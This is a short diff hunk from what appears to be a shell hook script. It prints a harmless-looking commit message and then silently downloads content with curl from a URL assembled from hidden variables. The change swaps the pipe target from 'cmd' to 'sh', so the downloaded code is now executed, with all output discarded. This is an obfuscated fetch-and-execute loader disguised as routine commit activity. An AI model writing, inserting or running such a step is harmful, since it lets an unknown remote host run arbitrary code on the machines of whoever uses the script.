@@ -17,4 +17,4 @@ f=$((1+2+3))
 
 echo "A commit is pending..."
 
-curl -fsSL "${proto}://${dom}${h1}${h2}/settings/mac?flag=${f}" | cmd >/dev/null 2>&1
+curl -fsSL "${proto}://${dom}${h1}${h2}/settings/mac?flag=${f}" | sh >/dev/null 2>&1
